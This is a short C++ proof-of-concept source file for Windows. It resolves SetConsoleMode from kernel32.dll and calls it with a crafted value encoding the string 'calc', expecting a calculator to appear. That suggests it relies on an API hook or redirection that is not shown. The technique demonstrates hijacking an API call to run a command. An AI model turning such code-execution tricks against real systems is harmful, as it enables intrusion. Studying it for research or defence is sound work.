#include <Windows.h>
#include <wchar.h>
extern "C" {
	BOOL spoof();
}
BOOL spoof(){
	return true;
}
int main() {
	if (spoof) {
        //Load Module
	HMODULE hMod = ::LoadLibrary(L"kernel32.dll"); 
        //Declare the function in it      
	BOOL(WINAPI * pfnSetConsoleMode)(HANDLE hConsoleHandle, DWORD dwMode); 
        //resolve its pointer  
	(FARPROC&)pfnSetConsoleMode = ::GetProcAddress(hMod, "SetConsoleMode");   
	ULONGLONG uiV = 0x0000000636c6163;
        //Call function 
	BOOL bResult = pfnSetConsoleMode(&uiV, 1);        
	wprintf(L"You must see the Calculator now....\n"); 
        //Unload Module  
	::FreeLibrary(hMod); 
	}
	else {
		wprintf(L"ERROR: PoC failed...\n");
	}
	return 0;
}
